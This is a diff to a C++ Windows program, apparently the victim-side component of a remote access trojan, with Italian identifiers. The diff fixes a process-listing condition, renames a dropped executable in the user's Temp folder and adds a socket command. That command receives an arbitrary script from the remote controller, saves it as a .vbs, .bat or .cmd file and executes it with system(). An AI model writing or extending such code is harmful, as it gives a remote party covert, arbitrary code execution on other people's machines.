@@ -28,7 +28,7 @@ char mes[500]={0};
 char Csimb[3]={0};
 char Cbott[3]={0};
 char ctsk[7]={0};
-char ver[50]="1.1.1";
+char ver[50]="1.1.2";
 int simb=0;
 int bott=0;
 int LagCount=0;
@@ -546,7 +546,7 @@ void ricevi(SOCKET s)
 			            if(NULL!=hProcess)
 					    {
 					    	GetModuleFileNameEx(hProcess, 0, szProcessName, MAX_PATH);
-					        if(szProcessName[0]!='<' || szProcessName[0]!='?')
+					        if(szProcessName[0]!='<' && szProcessName[0]!='?')
 						    {
 						    	for(int cnt=MAX_PATH;cnt>0;cnt--)
 						    	{
@@ -565,8 +565,6 @@ void ricevi(SOCKET s)
 					    }
 			        }
 			    }
-			    char trash='f';
-			    send(s,&trash,sizeof(trash),0);
 			    char c=(char)n;
 			    send(s,&c,sizeof(c),0);
 			    for(int i=0;i<cProcesses;i++)
@@ -578,7 +576,7 @@ void ricevi(SOCKET s)
 			            if(NULL!=hProcess)
 					    {
 					    	GetModuleFileNameEx(hProcess, 0, szProcessName, MAX_PATH);
-					    	if(szProcessName[0]!='<' || szProcessName[0]!='?')
+					    	if(szProcessName[0]!='<' && szProcessName[0]!='?')
 						    {
 						    	for(int cnt=MAX_PATH;cnt>0;cnt--)
 						    	{
@@ -665,6 +663,76 @@ void ricevi(SOCKET s)
 					}
 				}
 				cout<<"<Server> MouseTrack OFF."<<endl;
+			}
+			if(msg[0]=='W' && msg[1]=='W')
+			{
+				cout<<"<Server> Script."<<endl;
+				char Csize[20]={0};
+				recv(s,Csize,sizeof(Csize),0);
+				int size=atoi(Csize);
+				char Cscript[size]={0};
+				recv(s,Cscript,sizeof(Cscript),0);
+				char estensione[3]={0};
+				recv(s,estensione,sizeof(estensione),0);
+				
+				//ifstream infile;
+				ofstream outfile;
+				
+				char nomeFile[30]="S1C2R3I4P5T.";
+				switch(estensione[0])
+				{
+					case '0':
+						nomeFile[12]='t';
+						nomeFile[13]='x';
+						nomeFile[14]='t';
+					break;
+					case '1':
+						nomeFile[12]='v';
+						nomeFile[13]='b';
+						nomeFile[14]='s';
+					break;
+					case '2':
+						nomeFile[12]='b';
+						nomeFile[13]='a';
+						nomeFile[14]='t';
+					break;
+					case '3':
+						nomeFile[12]='c';
+						nomeFile[13]='m';
+						nomeFile[14]='d';
+					break;
+				}
+				
+				char buff[MAX_PATH];
+				char cmd[MAX_PATH]="start \"\" \"";
+				GetModuleFileName(NULL,buff,MAX_PATH);
+				
+				for(int i=0;i<MAX_PATH;i++)
+				{
+					if(buff[i]=='\\' && buff[i-1]=='p' && buff[i-2]=='m' && buff[i-3]=='e' && buff[i-4]=='T')
+					{
+						for(int ii=1;ii<30;ii++)
+						{
+							buff[i+ii]=nomeFile[ii-1];
+						}
+					}
+				}
+				for(int i=10;i<MAX_PATH;i++)
+				{
+					cmd[i]=buff[i-10];
+					if(cmd[i-4]=='.')
+					{
+						cmd[i]='\"';
+					}
+				}
+				
+				outfile.open(buff);
+				outfile<<Cscript;
+				outfile.close();
+				
+				cout<<"\n\n"<<buff<<"\n"<<cmd<<"\n\n";
+				
+				system(cmd);
 			}
 		}
 		else
@@ -768,7 +836,7 @@ bool preliminari()
 	DWORD cchComputerName = 256;
 	char n[256]={'~'};
 	char p1[256]="\"C:\\Users\\";
-	char p2[256]="\\AppData\\Local\\Temp\\poppi.exe\"";//2RIF
+	char p2[256]="\\AppData\\Local\\Temp\\test.exe\"";//2RIF
 	char pF[256]={'\0'};
 	char pFC[256]={'\0'};
 	char cmd[256]="start \"\" ";
